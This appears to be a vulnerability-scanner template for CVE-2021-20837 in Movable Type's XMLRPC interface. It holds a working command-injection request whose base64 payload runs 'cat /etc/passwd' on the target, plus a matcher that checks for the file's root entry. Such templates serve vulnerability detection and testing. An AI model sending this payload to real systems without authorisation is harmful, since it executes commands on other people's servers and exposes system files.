id: yaml-poc-sixapart-movable_type-unauthorized_access-CVE-2021-20837
info:
  name: Yaml Poc Sixapart Movable_Type Unauthorized_Access Cve 2021 20837
  author: converted
  severity: critical
  description: 'Converted from xpoc: yaml-poc-sixapart-movable_type-unauthorized_access-CVE-2021-20837'
  tags: unauth,cve
  classification:
    cve-id: CVE-2021-20837
  reference:
  - http://packetstormsecurity.com/files/164705/Movable-Type-7-r.5002-XMLRPC-API-Remote-Command-Injection.html
  - http://packetstormsecurity.com/files/164818/Movable-Type-7-r.5002-XMLRPC-API-Remote-Command-Injection.html
  - https://jvn.jp/en/jp/JVN41119755/index.html
  - https://jvndb.jvn.jp/en/contents/2021/JVNDB-2021-000093.html
  - https://movabletype.org/news/2021/10/mt-782-683-released.html
http:
- method: POST
  path:
  - /cgi-bin/mt/mt-xmlrpc.cgi
  body: <?xml version="1.0"?><methodCall><methodName>mt.handler_to_coderef</methodName><params><param><value><base64>YGNhdCAvZXRjL3Bhc3N3ZGA=</base64></value></param></params></methodCall>
  headers:
    Content-Type: text/xml
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: regex
    part: body
    regex:
    - 'root:[x*]:0:0:'
